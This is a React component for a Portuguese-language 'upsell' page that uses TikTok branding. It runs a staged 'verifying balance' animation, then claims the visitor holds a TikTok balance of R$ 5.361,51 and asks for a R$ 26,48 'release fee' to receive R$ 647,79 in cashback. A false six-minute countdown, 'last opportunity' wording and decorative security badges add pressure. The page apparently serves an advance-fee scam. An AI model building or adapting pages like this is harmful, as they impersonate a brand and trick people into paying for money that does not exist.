import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Coins, Wallet, Clock, Check, Undo2, Shield, TrendingUp, ArrowRight, Sparkles } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const RED = "#FE2B54";
const GREEN = "#10B981";
const UPSELL3_TAX = 26.48;
const CASHBACK = 647.79;

const Upsell3 = () => {
  const [countdown, setCountdown] = useState(6 * 60);
  const [visible, setVisible] = useState(false);
  const [phase, setPhase] = useState<"loading" | "main">("loading");
  const [loadProgress, setLoadProgress] = useState(0);
  const [loadStep, setLoadStep] = useState(0);
  const navigate = useNavigate();

  const loadingSteps = [
    { label: "Verificando saldo disponível", icon: "💰" },
    { label: "Calculando cashback aplicável", icon: "📊" },
    { label: "Confirmando elegibilidade", icon: "✅" },
    { label: "Preparando oferta exclusiva", icon: "🎁" },
  ];

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell3", content_type: "cashback" } });

    // Loading phase
    const progressInterval = setInterval(() => {
      setLoadProgress(p => {
        if (p >= 100) { clearInterval(progressInterval); return 100; }
        return p + 1.2;
      });
    }, 30);

    const stepTimers = loadingSteps.map((_, i) =>
      setTimeout(() => setLoadStep(i + 1), 600 + i * 700)
    );

    const showMain = setTimeout(() => {
      setPhase("main");
      requestAnimationFrame(() => setVisible(true));
    }, 3500);

    return () => {
      clearInterval(progressInterval);
      stepTimers.forEach(clearTimeout);
      clearTimeout(showMain);
    };
  }, []);

  useEffect(() => {
    if (phase !== "main") return;
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [phase]);

  const mins = String(Math.floor(countdown / 60)).padStart(2, "0");
  const secs = String(countdown % 60).padStart(2, "0");

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell3", value: UPSELL3_TAX } });
    navigate("/pagamento");
  };

  const fadeUp = (delay: number): React.CSSProperties => ({
    opacity: visible ? 1 : 0,
    transform: visible ? "translateY(0)" : "translateY(22px)",
    transition: `opacity 0.7s cubic-bezier(0.16,1,0.3,1) ${delay}s, transform 0.7s cubic-bezier(0.16,1,0.3,1) ${delay}s`,
  });

  const shadow3D = "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04), inset 0 1px 0 rgba(255,255,255,0.9)";

  // ─── LOADING PHASE ───
  if (phase === "loading") {
    return (
      <div style={{ fontFamily: FONT, background: "#fff", minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
        <div style={{
          width: "100%", background: "#fff", padding: "14px 0",
          borderBottom: "1px solid #f0f0f0",
          display: "flex", justifyContent: "center",
        }}>
          <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} />
        </div>

        <div style={{
          flex: 1, display: "flex", flexDirection: "column",
          alignItems: "center", justifyContent: "center",
          maxWidth: 449, margin: "0 auto", width: "100%", padding: "0 24px",
        }}>
          {/* Orbital Icon */}
          <div style={{
            position: "relative", width: 80, height: 80,
            marginBottom: 32,
          }}>
            <div style={{
              position: "absolute", inset: 0,
              borderRadius: "50%",
              border: "2px solid rgba(16,185,129,0.12)",
              animation: "ringPulse 2s ease-in-out infinite",
            }} />
            <div style={{
              position: "absolute", inset: 6,
              borderRadius: "50%",
              border: "2px dashed rgba(16,185,129,0.15)",
              animation: "spinSlow 8s linear infinite",
            }} />
            <div style={{
              position: "absolute", inset: 14,
              borderRadius: "50%",
              background: `linear-gradient(135deg, ${GREEN}, #059669)`,
              display: "flex", alignItems: "center", justifyContent: "center",
              boxShadow: `0 4px 20px rgba(16,185,129,0.35)`,
            }}>
              <Coins size={22} color="#fff" />
            </div>
          </div>

          {/* Progress */}
          <div style={{ width: "100%", maxWidth: 280 }}>
            <div style={{
              height: 4, background: "#f0f0f0", borderRadius: 99,
              overflow: "hidden", marginBottom: 24,
            }}>
              <div style={{
                height: "100%", borderRadius: 99,
                background: `linear-gradient(90deg, ${GREEN}, #34D399)`,
                width: `${Math.min(loadProgress, 100)}%`,
                transition: "width 0.15s linear",
              }} />
            </div>
          </div>

          {/* Steps */}
          <div style={{ display: "flex", flexDirection: "column", gap: 12, width: "100%", maxWidth: 280 }}>
            {loadingSteps.map((step, i) => {
              const done = loadStep > i;
              const active = loadStep === i + 1 && !done;
              return (
                <div key={i} style={{
                  display: "flex", alignItems: "center", gap: 12,
                  opacity: loadStep >= i + 1 ? 1 : 0.3,
                  transform: loadStep >= i + 1 ? "translateX(0)" : "translateX(-8px)",
                  transition: `all 0.4s cubic-bezier(0.16,1,0.3,1) ${i * 0.05}s`,
                }}>
                  <div style={{
                    width: 32, height: 32, borderRadius: 8,
                    background: done ? GREEN : active ? "#F0FDF4" : "#F8F9FB",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    fontSize: 14,
                    transition: "all 0.3s ease",
                    boxShadow: done ? `0 2px 8px rgba(16,185,129,0.2)` : "none",
                  }}>
                    {done ? <Check size={14} color="#fff" strokeWidth={3} /> : step.icon}
                  </div>
                  <span style={{
                    fontSize: 13, fontWeight: done ? 600 : 400,
                    color: done ? "#000" : active ? "#333" : "#999",
                    transition: "all 0.3s ease",
                  }}>
                    {step.label}
                  </span>
                  {done && (
                    <span style={{
                      marginLeft: "auto", fontSize: 10, fontWeight: 700,
                      color: GREEN, background: "#F0FDF4",
                      padding: "2px 8px", borderRadius: 99,
                    }}>OK</span>
                  )}
                </div>
              );
            })}
          </div>

          <div style={{
            display: "flex", alignItems: "center", gap: 5,
            marginTop: 28, fontSize: 10, color: "#ccc", fontWeight: 500,
          }}>
            <Shield size={10} color="#ccc" />
            Conexão segura · SSL 256-bit
          </div>
        </div>
      </div>
    );
  }

  // ─── MAIN PHASE ───
  return (
    <div style={{ fontFamily: FONT, background: "#F5F5F5", minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{
        width: "100%", background: "#fff", padding: "14px 0",
        borderBottom: "1px solid #eee",
        display: "flex", justifyContent: "center",
        position: "sticky", top: 0, zIndex: 100,
        boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
      }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} loading="eager" decoding="async" />
      </div>

      {/* Alert Banner */}
      <div style={{
        ...fadeUp(0),
        background: `linear-gradient(135deg, ${RED}, #E91E4D)`,
        color: "#fff", textAlign: "center",
        padding: "11px 16px", fontWeight: 700, fontSize: 12,
        display: "flex", alignItems: "center", justifyContent: "center", gap: 6,
        letterSpacing: "0.3px",
      }}>
        <Sparkles size={13} style={{ animation: "zapFlash 2s ease-in-out infinite" }} />
        CASHBACK EXCLUSIVO LIBERADO
      </div>

      {/* Container */}
      <div style={{ maxWidth: 449, margin: "0 auto", width: "100%", padding: "16px 12px 110px" }}>

        {/* Hero Card */}
        <div style={{
          ...fadeUp(0.05),
          background: "#fff", borderRadius: 16, padding: "28px 20px 24px",
          boxShadow: shadow3D, textAlign: "center",
        }}>
          <div style={{
            ...fadeUp(0.1),
            width: 56, height: 56,
            background: `linear-gradient(135deg, ${GREEN}, #059669)`,
            borderRadius: "50%",
            display: "flex", alignItems: "center", justifyContent: "center",
            margin: "0 auto 16px",
            boxShadow: `0 6px 24px rgba(16,185,129,0.3), 0 0 0 6px rgba(16,185,129,0.08)`,
            animation: "softPulse 2.5s ease-in-out infinite",
          }}>
            <Coins size={24} color="#fff" />
          </div>

          <h1 style={{ ...fadeUp(0.15), color: "#000", fontSize: 20, fontWeight: 800, marginBottom: 8, letterSpacing: "-0.3px" }}>
            Receba o Valor Completo
          </h1>
          <p style={{ ...fadeUp(0.2), fontSize: 13, color: "#666", lineHeight: 1.7, maxWidth: 300, margin: "0 auto" }}>
            Pague apenas <span style={{
              background: RED, color: "#fff", fontWeight: 700,
              padding: "1px 8px", borderRadius: 99, fontSize: 12,
            }}>9%</span>{" "}
            das taxas e receba{" "}
            <strong style={{ color: RED, fontWeight: 800 }}>
              R$ {CASHBACK.toFixed(2).replace(".", ",")}
            </strong>{" "}
            na sua conta
          </p>
        </div>

        {/* Breakdown Card */}
        <div style={{
          ...fadeUp(0.25),
          background: "#fff", borderRadius: 16, padding: "22px 18px",
          marginTop: 12, boxShadow: shadow3D,
        }}>
          <div style={{
            display: "inline-flex", alignItems: "center", gap: 6,
            background: `linear-gradient(135deg, ${RED}, #E91E4D)`,
            color: "#fff", padding: "5px 14px", borderRadius: 99,
            fontSize: 10, fontWeight: 700, marginBottom: 18,
            boxShadow: `0 3px 12px rgba(254,43,84,0.2)`,
          }}>
            <Undo2 size={11} />
            DETALHAMENTO DO CASHBACK
          </div>

          {/* Breakdown rows */}
          <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
            {[
              { label: "Saldo TikTok acumulado", value: "R$ 5.361,51", icon: <TrendingUp size={13} color={GREEN} /> },
              { label: "Taxas de processamento", value: "- R$ 647,79", icon: <Coins size={13} color="#999" /> },
              { label: "Cashback das taxas (100%)", value: "+ R$ 647,79", color: GREEN, icon: <Undo2 size={13} color={GREEN} />, bold: true },
            ].map((row, i) => (
              <div key={i} style={{
                ...fadeUp(0.3 + i * 0.05),
                display: "flex", alignItems: "center", justifyContent: "space-between",
                padding: "12px 0",
                borderBottom: i < 2 ? "1px solid #f5f5f5" : "none",
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <div style={{
                    width: 30, height: 30, borderRadius: 8,
                    background: row.bold ? "#F0FDF4" : "#F8F9FB",
                    display: "flex", alignItems: "center", justifyContent: "center",
                  }}>
                    {row.icon}
                  </div>
                  <span style={{ fontSize: 12, color: "#555", fontWeight: row.bold ? 600 : 400 }}>{row.label}</span>
                </div>
                <span style={{
                  fontSize: 13, fontWeight: row.bold ? 800 : 600,
                  color: row.color || "#000",
                }}>{row.value}</span>
              </div>
            ))}
          </div>

          {/* Total Highlight */}
          <div style={{
            ...fadeUp(0.45),
            background: `linear-gradient(135deg, #FFF0F3, #FFF5F7)`,
            borderRadius: 12, padding: "18px 16px",
            margin: "16px 0",
            border: `1px solid rgba(254,43,84,0.08)`,
            display: "flex", alignItems: "center", justifyContent: "space-between",
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.6)",
          }}>
            <div>
              <p style={{ fontSize: 11, color: "#848286", marginBottom: 2, fontWeight: 500 }}>Valor total a receber</p>
              <p style={{ fontSize: 26, fontWeight: 900, color: RED, letterSpacing: "-0.5px", animation: "countPulse 3s ease-in-out infinite" }}>
                R$ {CASHBACK.toFixed(2).replace(".", ",")}
              </p>
            </div>
            <div style={{
              width: 44, height: 44, borderRadius: "50%",
              background: `linear-gradient(135deg, ${RED}, #E91E4D)`,
              display: "flex", alignItems: "center", justifyContent: "center",
              boxShadow: `0 4px 16px rgba(254,43,84,0.25)`,
            }}>
              <Wallet size={18} color="#fff" />
            </div>
          </div>

          {/* Fee row */}
          <div style={{
            ...fadeUp(0.5),
            background: "#F8F9FB", borderRadius: 10, padding: "12px 14px",
            display: "flex", alignItems: "center", justifyContent: "space-between",
            marginBottom: 18,
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 3px rgba(0,0,0,0.02)",
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 12, color: "#666" }}>Taxa única de liberação</span>
            </div>
            <span style={{ fontSize: 15, fontWeight: 800, color: "#000" }}>
              R$ {UPSELL3_TAX.toFixed(2).replace(".", ",")}
            </span>
          </div>

          {/* Benefits */}
          <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 20 }}>
            {["Cashback integral das taxas", "Crédito em até 5 minutos", "Sem cobranças futuras"].map((text, i) => (
              <div key={text} style={{
                ...fadeUp(0.55 + i * 0.04),
                display: "flex", alignItems: "center", gap: 10,
              }}>
                <div style={{
                  width: 20, height: 20, borderRadius: "50%",
                  background: GREEN, display: "flex",
                  alignItems: "center", justifyContent: "center",
                  boxShadow: `0 2px 6px rgba(16,185,129,0.2)`,
                  flexShrink: 0,
                }}>
                  <Check size={11} color="#fff" strokeWidth={3} />
                </div>
                <span style={{ fontSize: 12, color: "#555", fontWeight: 500 }}>{text}</span>
              </div>
            ))}
          </div>

          {/* CTA */}
          <button
            onClick={handlePagar}
            style={{
              width: "100%", border: 0, borderRadius: 14,
              padding: "17px 16px", fontSize: 15, fontWeight: 700,
              cursor: "pointer", color: "#fff",
              background: `linear-gradient(135deg, ${GREEN}, #059669)`,
              display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
              boxShadow: `0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15)`,
              fontFamily: FONT, letterSpacing: "0.3px",
              transition: "transform 0.15s ease",
              animation: "ctaGlowGreen 2s ease-in-out infinite",
            }}
            onMouseDown={e => (e.currentTarget.style.transform = "scale(0.97)")}
            onMouseUp={e => (e.currentTarget.style.transform = "scale(1)")}
            onMouseLeave={e => (e.currentTarget.style.transform = "scale(1)")}
          >
            <Wallet size={17} />
            RECEBER CASHBACK AGORA
            <ArrowRight size={15} style={{ marginLeft: 2 }} />
          </button>
        </div>

        {/* Timer + Security */}
        <div style={{
          ...fadeUp(0.65),
          background: "#fff", borderRadius: 12, padding: "14px 16px",
          marginTop: 12, boxShadow: "0 1px 12px rgba(0,0,0,0.04)",
          display: "flex", flexDirection: "column", alignItems: "center", gap: 10,
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 500, color: "#848286" }}>
            <Clock size={13} />
            Oferta disponível por:{" "}
            <span style={{
              color: RED, fontWeight: 700, fontSize: 13,
              background: "rgba(254,43,84,0.06)", padding: "2px 10px", borderRadius: 6,
              fontVariantNumeric: "tabular-nums",
            }}>
              {mins}:{secs}
            </span>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
            <Shield size={11} color={GREEN} />
            Pagamento 100% seguro e protegido
          </div>
        </div>

        <p style={{ ...fadeUp(0.7), textAlign: "center", fontSize: 11, color: "#bbb", marginTop: 14, lineHeight: 1.5, padding: "0 8px" }}>
          Última oportunidade de receber o valor completo com todas as taxas de volta.
        </p>
      </div>

      <style>{`
        @keyframes softPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.06); }
        }
        @keyframes zapFlash {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.6; transform: scale(1.15); }
        }
        @keyframes countPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }
        @keyframes ctaGlowGreen {
          0%, 100% { box-shadow: 0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15); }
          50% { box-shadow: 0 8px 32px rgba(16,185,129,0.4), 0 4px 12px rgba(16,185,129,0.2), inset 0 1px 0 rgba(255,255,255,0.15); }
        }
        @keyframes ringPulse {
          0%, 100% { transform: scale(1); opacity: 0.5; }
          50% { transform: scale(1.08); opacity: 1; }
        }
        @keyframes spinSlow {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default Upsell3;
